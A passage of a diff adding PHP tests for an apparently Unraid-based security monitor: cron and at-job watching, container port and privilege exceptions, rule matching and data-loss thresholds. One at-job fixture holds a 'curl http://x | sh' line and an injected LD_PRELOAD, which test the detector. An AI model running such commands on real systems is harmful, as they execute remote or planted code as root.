+        [false, true, null, 'abcdef0123456789'], [!empty($ab[0]['important']), !empty($ab2[0]['important']), $ab[0]['p']['_one'] ?? null, $ab2[0]['p']['_one'] ?? null]);
+    $sk = ['crontab' => ['lines' => [], 'twice' => [], 'office' => []]];
+    $sb = [];
+    $sline = fn (string $l) => [substr(md5($l), 0, 16) => $l];
+    $mine = $sline('cron.d/mine: 0 3 * * * /usr/local/bin/tidy');
+    $root = $sline('5 4 * * * /root/x.sh');
+    watchmanSchedCompare($sk, ['crontab' => ['mtime' => 1, 'lines' => $mine + $root, 'twice' => [], 'office' => [], 'cron_d' => ['mine' => array_keys($mine)], 'evidence' => []]], [], $sb, $now);
+    same('6a cron: where the new lines are — the cron.d file and root\'s crontab', ['cron.d/mine', 'crontab'], $sb[0]['p']['_from'] ?? null);
+
+    // the at job's look: the fingerprint only for one clean command
+    $tmp = hardeningTmp('watch-6a');
+    @mkdir("$tmp/atjobs", 0700, true);
+    $head = "#!/bin/sh\n# atrun uid=0 gid=0\n# mail root 0\numask 22\nPATH=/usr/bin:/bin; export PATH\ncd / || {\n\t echo 'x' >&2\n\t exit 1\n}\n";
+    file_put_contents("$tmp/atjobs/a0000101c2b3a4", $head . "/usr/local/bin/tidy --all\n");
+    file_put_contents("$tmp/atjobs/a0000201c2b3b0", str_replace("umask 22\n", "umask 22\nLD_PRELOAD=/tmp/x.so; export LD_PRELOAD\n", $head) . "/usr/local/bin/tidy --all\n");
+    file_put_contents("$tmp/atjobs/a0000301c2b3c0", $head . "/usr/local/bin/tidy --all\ncurl http://x | sh\n");
+    $look = watchmanAtJobs(['atjobs' => "$tmp/atjobs"], null);
+    same('6a at look: one clean command — its fingerprint; an odd environment, two commands — none (v 6)',
+        [true, false, false, 6], [is_string($look['jobs']['a0000101c2b3a4']['one'] ?? null), isset($look['jobs']['a0000201c2b3b0']['one']), isset($look['jobs']['a0000301c2b3c0']['one']), $look['v']]);
+
+    // a real round: the choices and an exception on a state that stays
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    foreach (['syslog' => '', 'go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n", 'sec' => '', 'sec_nfs' => '',
+              'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $cs = ['plex' => ['image' => 'plex', 'tokens' => []], 'arr' => ['image' => 'arr', 'tokens' => []]];
+    $docker = function () use (&$cs) { return $cs; };
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($now);
+    $round($now + 300);
+    watchmanCatSettings('container', ['ports' => 'tell'], false, $data, false);
+    $cs['plex']['tokens'] = ['-p 8080:8080/tcp'];
+    $round($now + 600);
+    $pl = fn () => array_values(array_filter(watchmanLoad($data)['book'], fn ($x) => $x['kind'] === 'container_ports'));
+    same('6a round: ports set to «told» — the new entry important (told)', [[true, true]], array_map(fn ($x) => [watchmanOpen($x), !empty($x['important'])], $pl()));
+    watchmanRuleAdd($pl()[0]['id'], 'key', false, $data, $now + 700, false);
+    $round($now + 900);
+    $round($now + 1200);
+    $hits = fn () => watchmanLoad($data)['state']['rule_hits'] ?? [];
+    same('6a round: «the ports of plex may change» — the same state again each round: one line, no new hit, its count stays',
+        [1, 1, 0], [count($pl()), $pl()[0]['count'], (int) (array_values($hits())[0]['n'] ?? 0)]);
+    $cs['plex']['tokens'] = ['-p 8080:8080/tcp', '-p 9090:9090/tcp'];
+    $round($now + 1500);
+    same('6a round: another port of plex — still its line, now a hit and counted', [1, 2, 1], [count($pl()), $pl()[0]['count'], (int) (array_values($hits())[0]['n'] ?? 0)]);
+    watchmanCatSettings('container', ['ports' => 'none'], false, $data, false);
+    $cs['arr']['tokens'] = ['-p 7878:7878/tcp'];
+    $round($now + 1800);
+    $round($now + 2100);
+    same('6a round: ports set to «not at all» — nothing about arr\'s new port in his book, normal from then on',
+        [[], ['-p 7878:7878/tcp']], [array_values(array_filter($pl(), fn ($x) => ($x['p']['name'] ?? '') === 'arr')), watchmanLoad($data)['baseline']['containers']['arr']['tokens'] ?? null]);
+    same('6a cat_set: a switch must be true or false, a choice one of its own',
+        ['bad_request', 'bad_request', null], [$err(fn () => watchmanCatSettings('container', ['plain' => 1], false, $data, false)),
+         $err(fn () => watchmanCatSettings('container', ['ports' => 'loud'], false, $data, false)), $err(fn () => watchmanCatSettings('container', ['plain' => true, 'ports' => 'quiet'], false, $data, false))]);
+    same('6a cat_set: only what differs kept (quiet is the default)', ['plain' => true], watchmanRulesRaw($data)['set']['container'] ?? null);
+
+    // exceptions by hand
+    $made = fn (string $cat, string $type, string $v, bool $sure = false) => watchmanRuleHandMake($cat, $type, $v, '');
+    same('6a hand: ports and rights of a container, a User Script, a plugin\'s .cron file (as keys), a cron.d file, a source',
+        [[['container_ports'], ['key' => 'container_ports:plex']], [['container_rights'], ['key' => 'container_rights:plex']], [['script_changed'], ['key' => 'script_changed:Nightly copy']],
+         [['cron_file'], ['key' => 'cron_file:dynamix/x.cron']], [['cron_new'], ['file' => 'mine']], [['plugin_new'], ['source' => 'github.com/alice']], false, true],
+        [[$made('container', 'ports', 'plex')['kinds'], $made('container', 'ports', 'plex')['on']], [$made('container', 'rights', 'plex')['kinds'], $made('container', 'rights', 'plex')['on']],
+         [$made('sched', 'script', 'Nightly copy')['kinds'], $made('sched', 'script', 'Nightly copy')['on']],
+         [$made('sched', 'cron_file', 'dynamix/x.cron')['kinds'], $made('sched', 'cron_file', 'dynamix/x.cron')['on']],
+         [$made('sched', 'crond', '/etc/cron.d/mine')['kinds'], $made('sched', 'crond', '/etc/cron.d/mine')['on']],
+         [$made('plugin', 'source', 'https://github.com/alice')['kinds'], $made('plugin', 'source', 'https://github.com/alice')['on']],
+         $made('plugin', 'source', 'github.com/alice')['wide'], $made('plugin', 'source', 'github.com')['wide']]);
+    same('6a hand: a whole source without a second yes (1.96: the dialog says what it means) — made; cron.d/root (Unraid\'s own), a name with a slash, a type of another area — refused',
+        [null, 'watch_value_bad', 'watch_value_bad', 'bad_request'],
+        [$err(fn () => watchmanRuleHand('plugin', 'source', 'github.com', '', false, $data, $now, false)), $err(fn () => watchmanRuleHandMake('sched', 'crond', 'root', '')),
+         $err(fn () => watchmanRuleHandMake('container', 'ports', '../x', '')), $err(fn () => watchmanRuleHandMake('container', 'script', 'x', ''))]);
+    same('6a hand: the page knows each area\'s types', WATCH_HAND, watchmanPageState($data, $now + 2100, false)['hand']);
+    hardeningRm($tmp);
+}
+
+/**
+ * 1.96, «Add an exception…» by hand: five more types (a container privileged, on the server's network or processes, new
+ * by its name; an SMB machine at any hour; floods on a port) — each through watchmanRuleHandMake(), covering its entry and
+ * not the neighbour's; the names he already knows, suggested as you type (watchmanHandNames(): only his own files and
+ * this state, sorted, capped, in their type's shape); the dialog's words and lists.
+ */
+function testWatchmanHandMore(): void
+{
+    $now = strtotime('2026-11-20 10:00:00');
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    $e = fn (string $kind, string $key, array $p) => watchmanEntry($kind, $key, $now, $p);
+    $made = fn (string $cat, string $type, string $v) => (fn ($m) => [$m['cat'], $m['kinds'], $m['on'], $m['wide']])(watchmanRuleHandMake($cat, $type, $v, ''));
+    same('hand: a container privileged, on the server\'s network or processes, new by its name (all three wide); an SMB machine at any hour; floods on a port',
+        [['container', ['container_privileged'], ['key' => 'container_privileged:plex'], true], ['container', ['container_host'], ['key' => 'container_host:plex'], true],
+         ['container', ['container_new'], ['key' => 'container_new:plex'], true], ['login', ['smb_hour'], ['machine' => 'LAPTOP-KUECHE'], false],
+         ['host', ['host_flood'], ['thing' => 'port:443'], false]],
+        [$made('container', 'privileged', 'plex'), $made('container', 'host', 'plex'), $made('container', 'new', ' plex '), $made('login', 'machine', 'LAPTOP-KUECHE'),
+         $made('host', 'flood', '443')]);
+    same('hand: refused — a container name with a slash, an address as a machine\'s name, a port 0 or over 65535, a port with letters, a type of another area',
+        ['watch_value_bad', 'watch_value_bad', 'watch_value_bad', 'watch_value_bad', 'watch_value_bad', 'bad_request'],
+        [$err(fn () => watchmanRuleHandMake('container', 'new', 'a/b', '')), $err(fn () => watchmanRuleHandMake('login', 'machine', '192.168.1.5', '')),
+         $err(fn () => watchmanRuleHandMake('host', 'flood', '0', '')), $err(fn () => watchmanRuleHandMake('host', 'flood', '65536', '')),
+         $err(fn () => watchmanRuleHandMake('host', 'flood', '44x', '')), $err(fn () => watchmanRuleHandMake('container', 'flood', '443', ''))]);
+    // each made rule in exactly a rule's shape, covering its entry — never the neighbour's
+    $rule = fn (string $cat, string $type, string $v) => watchmanRuleShaped(['id' => 'r0123456789', 'at' => $now] + watchmanRuleHandMake($cat, $type, $v, ''));
+    $pr = $rule('container', 'privileged', 'plex');
+    $ho = $rule('container', 'host', 'plex');
+    $nw = $rule('container', 'new', 'plex');
+    $mc = $rule('login', 'machine', 'LAPTOP');
+    $fl = $rule('host', 'flood', '443');
+    $flood = fn (?int $port) => $e('host_flood', 'host_flood:' . ($port === null ? 'conntrack' : "port:$port") . ':2026-11-20', ['port' => $port]);
+    same('hand: the rules pass the rules\' shaping; each covers its entry, not another container\'s, not the other kind, not another machine, not another port nor the full table',
+        [true, true, false, false, true, false, true, false, true, false, false, true, false, false],
+        [$pr !== null && $ho !== null && $nw !== null && $mc !== null && $fl !== null,
+         watchmanRuleCovers($pr, $e('container_privileged', 'container_privileged:plex', ['name' => 'plex', 'tokens' => ['--privileged']])),
+         watchmanRuleCovers($pr, $e('container_privileged', 'container_privileged:sonarr', ['name' => 'sonarr', 'tokens' => ['--privileged']])),
+         watchmanRuleCovers($pr, $e('container_host', 'container_host:plex', ['name' => 'plex', 'tokens' => ['--network=host']])),
+         watchmanRuleCovers($ho, $e('container_host', 'container_host:plex', ['name' => 'plex', 'tokens' => ['--pid=host']])),
+         watchmanRuleCovers($ho, $e('container_rights', 'container_rights:plex', ['name' => 'plex', 'tokens' => ['--cap-add=NET_ADMIN']])),
+         watchmanRuleCovers($nw, $e('container_new', 'container_new:plex', ['name' => 'plex', 'tokens' => ['--privileged']])),
+         watchmanRuleCovers($nw, $e('container_new', 'container_new:plex2', ['name' => 'plex2', 'tokens' => ['--privileged']])),
+         watchmanRuleCovers($mc, $e('smb_hour', 'smb_hour:192.168.1.5', ['ip' => '192.168.1.5', 'machine' => 'LAPTOP'])),
+         watchmanRuleCovers($mc, $e('smb_hour', 'smb_hour:192.168.1.6', ['ip' => '192.168.1.6', 'machine' => 'DESKTOP'])),
+         watchmanRuleCovers($mc, $e('smb_client', 'smb_client:192.168.1.5', ['ip' => '192.168.1.5', 'machine' => 'LAPTOP'])),
+         watchmanRuleCovers($fl, $flood(443)), watchmanRuleCovers($fl, $flood(80)), watchmanRuleCovers($fl, $flood(null))]);
+    same('hand: by hand the same rule as a click offers at the entry (an SMB machine, a flooded port)',
+        [true, true],
+        [in_array(['machine' => 'LAPTOP'], array_column(watchmanRuleOffers($e('smb_hour', 'smb_hour:192.168.1.5', ['ip' => '192.168.1.5', 'machine' => 'LAPTOP', 'users' => ['benj']]), []), 'on'), true),
+         in_array(['thing' => 'port:443'], array_column(watchmanRuleOffers($flood(443), []), 'on'), true)]);
+    same('hand: «X may run privileged» made by hand calls X intended in his posture tip, as a click\'s rule does',
+        ['privileged' => ['plex' => true]], watchmanPostureIntended([$pr, $ho, $nw]));
+
+    // a new container by its name in real rounds: let through with whatever rights, never learned, rights it gains later too
+    $tmp = hardeningTmp('watch-hand');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    foreach (['syslog' => '', 'go' => "#!/bin/bash\n", 'passwd' => "root:x:0:0::/root:/bin/bash\n", 'shadow' => 'root:$6$aa$bb:20000:0:99999:7:::' . "\n",
+              'sec' => "[Media]\nexport=\"e\"\nsecurity=\"private\"\n[flash]\nexport=\"e\"\nsecurity=\"private\"\n", 'sec_nfs' => '', 'share_cfg' => "shareSMBEnabled=\"yes\"\n"] as $k => $v) {
+        file_put_contents($paths[$k], $v);
+    }
+    $cs = ['plex' => ['image' => 'plex', 'tokens' => []]];
+    $docker = function () use (&$cs) { return $cs; };
+    $round = fn (int $t) => watchmanRound($paths, $data, 1000, $t, $docker, false, "$tmp/acks.json");
+    $round($now);
+    $round($now + 300);
+    watchmanRuleHand('container', 'new', 'vpn', '', false, $data, $now + 400, false);
+    $cs['vpn'] = ['image' => 'vpn', 'tokens' => ['--cap-add=NET_ADMIN', '--privileged']];
+    $cs['dri'] = ['image' => 'dri', 'tokens' => ['--device=/dev/dri']];
+    $round($now + 600);
+    $round($now + 900);
+    $book = fn () => watchmanLoad($data)['book'];
+    $news = fn (string $name) => array_values(array_filter($book(), fn ($x) => ($x['key'] ?? '') === "container_new:$name"));
+    $hits = fn () => (int) (array_values(watchmanLoad($data)['state']['rule_hits'] ?? [])[0]['n'] ?? 0);
+    same('hand round: a new privileged vpn — one line noted by the rule, again a round later no new hit; never learned; the new dri beside it open',
+        [1, false, 'rule', 1, false, true],
+        [count($news('vpn')), watchmanOpen($news('vpn')[0]), $news('vpn')[0]['by'] ?? null, $hits(), isset(watchmanLoad($data)['baseline']['containers']['vpn']),
+         watchmanOpen($news('dri')[0] ?? ['kind' => 'container_new'])]);
+    $cs['vpn']['tokens'][] = '--network=host';
+    $round($now + 1200);
+    same('hand round: vpn gains --network=host — still its one line, let through (a hit), no entry of another kind',
+        [1, false, 2, []], [count($news('vpn')), watchmanOpen($news('vpn')[0]), $hits(),
+         array_values(array_filter($book(), fn ($x) => in_array($x['kind'], ['container_host', 'container_privileged'], true)))]);
+
+    // the names he knows: from his own files and this state only, sorted, capped, in their type's shape, never the flash
+    $st = watchmanPageState($data, $now + 1300, false);
+    same('names: the page state brings them — containers he knows, the shares Unraid exports (not the flash), the products',
+        [['dri', 'plex', 'vpn'], ['Media'], true],
+        [array_values(array_intersect($st['hand_names']['container'] ?? [], ['dri', 'plex', 'vpn'])), $st['hand_names']['share'] ?? null,
+         in_array('php', $st['hand_names']['product'] ?? [], true)]);
+    $many = [];
+    for ($i = 0; $i < 150; $i++) {
+        $many["c$i"] = ['tokens' => [], 'seen' => 1];
+    }
+    $b = ['containers' => $many + ['bad/name' => ['tokens' => []]], 'shares' => ['Media' => [], 'flash' => [], 'b' => [], 'A' => []],
+          'sched' => ['scripts' => ['backup' => ['h' => 'x']], 'files' => ['dynamix/a.cron' => ['h' => 'x'], 'gone/b.cron' => ['h' => 'y', 'gone' => 5]]],
+          'flash' => ['extra' => ['htop.txz' => []]], 'snaps' => ['series' => ['zfs-auto-snap_hourly-#' => 1]],
+          'host' => ['doors' => [['what' => 'wg', 'name' => 'wg0', 'on' => true], ['what' => 'ssh', 'name' => 'ssh']]],
+          'net' => ['senders' => ['192.168.1.1' => []], 'admins' => ['admin' => []], 'vpn' => ['phone' => []]],
+          'flow' => ['smb_clients' => ['192.168.1.5' => ['name' => 'LAPTOP'], '192.168.1.6' => ['name' => '192.168.1.6']]], 'plugins' => ['ca' => ['source' => 'github.com/someone']]];
+    $seen = ['sched' => ['crontab' => ['cron_d' => ['root' => [], 'mine' => []]]], 'host' => ['listen' => ['tcp:8384' => ['prog' => 'syncthing'], 'tcp:1' => ['prog' => '?']]]];
+    $flow = ['shares' => ['tank/Fotos' => []], 'disk_w' => ['disk4' => []], 'can' => ['fs' => ['disk1' => 'btrfs', 'disk2' => 'zfs']], 'gone' => ['disk:disk4' => ['disk' => 'disk4']]];
+    $state = ['book' => [['kind' => 'net_new_device', 'p' => ['network' => 'Gäste']], ['kind' => 'host_flood', 'p' => ['port' => 443]], ['kind' => 'host_flood', 'p' => ['port' => null]],
+                         ['kind' => 'snap_gone', 'p' => ['datasets' => ['tank/Media', 'tank'], 'series' => ['autosnap_#']]], ['kind' => 'host_crash', 'p' => ['prog' => 'smbd']],
+                         ['kind' => 'net_link_down', 'p' => ['iface' => 'ether5', 'sender' => '192.168.1.1']]],
+              'hold' => ['look' => ['vms' => [['name' => 'Windows 11']], 'holds' => [['kind' => 'userscript', 'name' => 'fotos sichern']], 'containers' => [['name' => 'plex']]]],
+              'wakes' => ['hdds' => ['disk3'], 'wakes' => [['disks' => ['parity'], 'who' => [['kind' => 'container', 'name' => 'plex'], ['kind' => 'program', 'name' => '', 'desk' => '', 'prog' => 'rsync']]]]]];
+    $n = watchmanHandNames($b, $seen, $flow, $state);
+    same('names: capped at 100, sorted naturally, only names a rule takes (no slash), the flash and the gone left out',
+        [100, 'c0', 'c1', 'c2', false, ['A', 'b', 'Fotos', 'Media'], ['dynamix/a.cron'], ['mine'], ['htop.txz'], ['wg0'], ['192.168.1.1'], ['ether5'], ['admin'], ['phone']],
+        [count($n['container']), $n['container'][0], $n['container'][1], $n['container'][2], in_array('bad/name', $n['container'], true), $n['share'], $n['cron_file'], $n['crond'],
+         $n['extra'], $n['tunnel'], $n['sender'], $n['iface'], $n['admin'], $n['vpn']]);
+    same('names: disks (XFS/btrfs ones the flow measures; the rotating ones for the wakes), datasets never a whole pool, series, programs without «?», machines without an address, flooded ports, causes',
+        [['disk1', 'disk4'], ['disk3', 'parity'], ['tank/Fotos', 'tank/Media'], ['autosnap_#', 'zfs-auto-snap_hourly-#'], ['smbd', 'syncthing'], ['LAPTOP'], ['443'],
+         ['container:plex', 'program:rsync'], ['Gäste'], ['Windows 11'], ['backup', 'fotos sichern'], ['github.com/someone']],
+        [$n['disk'], $n['wake_disk'], $n['dataset'], $n['series'], $n['prog'], $n['machine'], $n['flood'], $n['cause'], $n['network'], $n['vm'], $n['script'], $n['source']]);
+    same('names: nothing known — only the products (a list of names, no empty lists)', [['product'], true],
+        (fn ($x) => [array_keys($x), array_is_list($x['product'])])(watchmanHandNames(null, null, null, [])));
+    $size = strlen(jsonEncode($n));
+    check("names: the lists stay small (here $size bytes for 100 containers and the rest)", $size < 6000, (string) $size);
+    hardeningRm($tmp);
+
+    // the words and the page
+    $keys = ['setup.add_unknown', 'rule.key.container_host', 'rule.key.container_new'];
+    foreach (['privileged', 'host', 'new', 'machine', 'flood'] as $k) {
+        $keys[] = "setup.add_type.$k";
+        $keys[] = "setup.add_value.$k";
+    }
+    foreach (['privileged', 'host', 'new'] as $k) {
+        $keys[] = "setup.add_wide.$k";
+    }
+    $missing = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$code.json");
+        foreach ($keys as $k) {
+            if (!is_string($lang[$k] ?? null)) {
+                $missing[] = "$code $k";
+            }
+        }
+        foreach (array_merge(...array_values(WATCH_HAND)) as $t) {
+            if (!in_array($t, ['net', 'ip', 'user_net'], true) && !is_string($lang["setup.add_type.$t"] ?? null)) {
+                $missing[] = "$code setup.add_type.$t";
+            }
+        }
+    }
+    same('words: every hand type, the new notes and the line for a name he doesn\'t know — in five languages', [], $missing);
+    $js = (string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js');
+    preg_match('/const HAND_EXAMPLE = \{(.*?)\};/s', $js, $m);
+    check('page: no example is «…» any more, the five new types have one; the protocol and a cause\'s kind are choices; the names as a datalist',
+        isset($m[1]) && !str_contains($m[1], '…') && !array_filter(['privileged', 'host', 'new', 'machine', 'flood'], fn ($t) => !preg_match("/\\b$t: '/", $m[1]))
+        && str_contains($js, "guest_read: ['setup.add_second.proto', null, ['smb', 'nfs']]") && str_contains($js, "cause: ['setup.add_second.cause', null, ['container',")
+        && str_contains($js, "el('datalist')"));
+}
+
+/**
+ * 1.96 step 6b — the data flow: settings (defaults = the constants he judged by), exceptions on a share or disk (let through
+ * in the rules' pass), thresholds where the flow is judged (an amount, a snapshot's hold, new Docker layers) with their hits,
+ * and «always tell» (half a share, 200 000 files in an hour) that no exception silences. The existing flow tests run unchanged.
+ */
+function testWatchmanRules6b(): void
+{
+    $gb = 1024 ** 3;
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6b settings: the defaults are the constants he judged by', [WATCH_FLOW_FACTOR, WATCH_FLOW_MIN, WATCH_FLOW_NEW, WATCH_FLOW_FACTOR, WATCH_FLOW_MIN, WATCH_FLOW_MIN, WATCH_FILES_MIN, true, true],
+        [WATCH_SETTINGS['pull']['factor']['def'], WATCH_SETTINGS['pull']['min']['def'] * $gb, WATCH_SETTINGS['pull']['new']['def'] * $gb, WATCH_SETTINGS['data']['factor']['def'],
+         WATCH_SETTINGS['data']['gone_min']['def'] * $gb, WATCH_SETTINGS['data']['written_min']['def'] * $gb, WATCH_SETTINGS['data']['files_min']['def'],
+         WATCH_SETTINGS['data']['kept']['def'], WATCH_SETTINGS['data']['must']['def']]);
+    same('6b things: a share by its gone, files, written key (without its pool); a disk; a client none',
+        [['share', 'Serien'], ['share', 'Serien'], ['share', 'Serien'], ['disk', 'disk1'], ['disk', 'disk1'], ['disk', 'disk1'], null],
+        array_map('watchmanFlowThing', ['flow_gone:share:Serien', 'flow_gone:files:share:Serien', 'flow_written:tank/Serien', 'flow_gone:disk:disk1',
+            'flow_gone:files:disk:disk1', 'flow_written:disk:disk1', 'flow_client:192.0.2.7|smb']));
+    $e = fn (string $kind, string $key, array $p = []) => watchmanEntry($kind, $key, 1, $p);
+    $cov = fn (array $kinds, array $on, array $x) => watchmanRuleCovers(['kinds' => $kinds, 'on' => $on], $x);
+    same('6b share: its deletions (bytes and files) yes; Filme\'s, a disk named so, its writing (kinds) no',
+        [true, true, false, false, false],
+        [$cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:share:Serien')), $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:files:share:Serien')),
+         $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:share:Filme')), $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_gone', 'flow_gone:disk:Serien')),
+         $cov(['flow_gone'], ['share' => 'Serien'], $e('flow_written', 'flow_written:tank/Serien'))]);
+    same('6b disk: its writing yes; another disk, a share named so no', [true, false, false],
+        [$cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:disk:disk1')), $cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:disk:disk2')),
+         $cov(['flow_written'], ['disk' => 'disk1'], $e('flow_written', 'flow_written:tank/disk1'))]);
+    $shape = fn (array $kinds, array $opt) => watchmanRuleShaped(['id' => 'r0000000001', 'cat' => 'data', 'kinds' => $kinds, 'on' => ['share' => 'Serien'], 'at' => 1, 'opt' => $opt]);
+    same('6b thresholds: only in exactly their shape and on their kinds', [true, true, true, true, false, false, false, false],
+        [$shape(['flow_gone'], ['min' => 5 * $gb]) !== null, $shape(['flow_gone'], ['files' => 9000]) !== null, $shape(['flow_gone'], ['kept' => false]) !== null,
+         $shape(['flow_written'], ['layers' => false]) !== null, $shape(['flow_written'], ['kept' => false]) !== null, $shape(['flow_gone'], ['min' => -1]) !== null,
+         $shape(['flow_gone'], ['min' => 1, 'files' => 1]) !== null,
+         watchmanRuleShaped(['id' => 'r0000000001', 'cat' => 'login', 'kinds' => ['login_new_ip'], 'on' => ['net' => '10.0.0.0/8'], 'at' => 1, 'opt' => ['min' => 1]]) !== null]);
+    $types = fn (array $x) => array_column(watchmanRuleOffers($x, [$x]), 'type');
+    $o = watchmanRuleOffers($e('flow_gone', 'flow_gone:share:Serien', ['share' => 'Serien', 'peak' => 30 * $gb + 7, 'kept' => 5 * $gb]), []);
+    same('6b offers: gone from a share — not judging it, from twice its busiest hour (whole GB), the snapshot\'s hold; written with new image layers; a client; a container',
+        [['share', 'min', 'kept'], 61 * $gb, ['share', 'min', 'layers'], ['min', 'key'], ['key'], ['disk', 'min'], 4000],
+        [array_column($o, 'type'), $o[1]['opt']['min'] ?? null,
+         $types($e('flow_written', 'flow_written:tank/Serien', ['share' => 'tank/Serien', 'peak' => $gb, 'src' => ['ly:abc' => 1, 'own' => 2]])),
+         $types($e('flow_client', 'flow_client:192.0.2.7|smb', ['ip' => '192.0.2.7', 'peak' => 3 * $gb])), $types($e('flow_container', 'flow_container:x', ['name' => 'x'])),
+         $types($e('flow_gone', 'flow_gone:disk:disk1', ['disk' => 'disk1', 'peak' => $gb])),
+         watchmanRuleOffers($e('flow_gone', 'flow_gone:files:share:Serien', ['peak' => 1600]), [])[1]['opt']['files'] ?? null]);
+
+    // rounds on made-up looks (as testWatchmanFlowGone): Serien loses data while he is still learning (clear: 100 GB)
+    $t0 = strtotime('2026-10-06 14:02:00');
+    $ds = fn (int $r, int $b = 0, int $x = 0) => ['w' => 0, 'u' => $r + $b, 's' => 1000, 'r' => $r, 'b' => $b, 'x' => $x];
+    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
+                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
+    $zfs = fn (array $sets) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => []];
+    $rule = fn (array $kinds, array $on, ?array $opt = null) => ['id' => 'r00000000' . substr(md5(json_encode([$kinds, $on, $opt])), 0, 2), 'cat' => 'data', 'kinds' => $kinds, 'on' => $on,
+                                                                 'at' => 1, 'from' => 'hand', 'note' => ''] + ($opt !== null ? ['opt' => $opt] : []);
+    // $after: Serien's datasets after the round; $judge: settings and rules — the entry, the hits
+    $run = function (array $after, array $judge) use ($look, $zfs, $ds, $gb, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs(['tank/Serien' => $ds(1000 * $gb), 'tank/Filme' => $ds(100 * $gb)])]), $book, $t0);
+        [, $flow] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($after + ['tank/Filme' => $ds(100 * $gb)])]), $book, $t0 + 300, $judge);
+        $open = array_column(array_filter($book, 'watchmanOpen'), null, 'key');
+        return [$open['flow_gone:share:Serien']['p'] ?? null, $judge['hits'] ?? [], $book];
+    };
+    $set = fn (array $data) => ['set' => watchmanSettings(['set' => ['data' => $data]])];
+    $lost = ['tank/Serien' => $ds(700 * $gb, 200 * $gb)];          // 300 GB gone, 200 GB of it still in snapshots
+    [$p0] = $run($lost, []);
+    same('6b gone: by default as up to 1.95 — 300 GB told, 200 GB of it still in snapshots', [300 * $gb, 200 * $gb, false], [$p0['bytes'] ?? null, $p0['kept'] ?? null, isset($p0['_must'])]);
+    [$p1] = $run($lost, $set(['kept' => false]));
+    same('6b gone: «what a snapshot holds counts as gone» off — 100 GB left, not over the clear: nothing', null, $p1);
+    $kept = $rule(['flow_gone'], ['share' => 'Serien'], ['kept' => false]);
+    [$p2, $h2] = $run($lost, ['rules' => [$kept]]);
+    same('6b gone: «in Serien, what a snapshot holds doesn\'t count» — nothing, the threshold\'s hit', [null, 1], [$p2, $h2[$kept['id']]['n'] ?? 0]);
+    [$p2b] = $run($lost, ['rules' => [$rule(['flow_gone'], ['share' => 'Filme'], ['kept' => false])]]);
+    same('6b gone: the same for Filme doesn\'t cover Serien — told', 300 * $gb, $p2b['bytes'] ?? null);
+    $min = $rule(['flow_gone'], ['share' => 'Serien'], ['min' => 400 * $gb]);
+    [$p3, $h3] = $run($lost, ['rules' => [$min]]);
+    same('6b gone: «Serien: from 400 GB an hour» — 300 GB nothing, a hit; at 250 GB it would be told anyway: 300 told, no hit',
+        [null, 1, 300 * $gb, []], [$p3, $h3[$min['id']]['n'] ?? 0, ...(fn ($r) => [$r[0]['bytes'] ?? null, $r[1]])($run($lost, ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 250 * $gb])]]))]);
+    same('6b gone: a threshold on writing doesn\'t touch deletions', 300 * $gb, $run($lost, ['rules' => [$rule(['flow_written'], ['share' => 'Serien'], ['min' => 900 * $gb])]])[0]['bytes'] ?? null);
+    // «always tell»: 700 of 1000 GB gone within the hour
+    $half = ['tank/Serien' => $ds(300 * $gb)];
+    [$p4, $h4] = $run($half, ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 900 * $gb])]]);
+    same('6b always tell: 70 % of Serien gone — told whatever the threshold (no hit), marked for the rules\' pass', [700 * $gb, true, []], [$p4['bytes'] ?? null, !empty($p4['_must']), $h4]);
+    [$p5] = $run($half, $set(['must' => false]) + ['rules' => [$rule(['flow_gone'], ['share' => 'Serien'], ['min' => 900 * $gb])]]);
+    same('6b always tell switched off: the threshold holds', null, $p5);
+    // the rules' pass: «don't judge deletions in Serien» lets the 300 GB through — never the 70 %
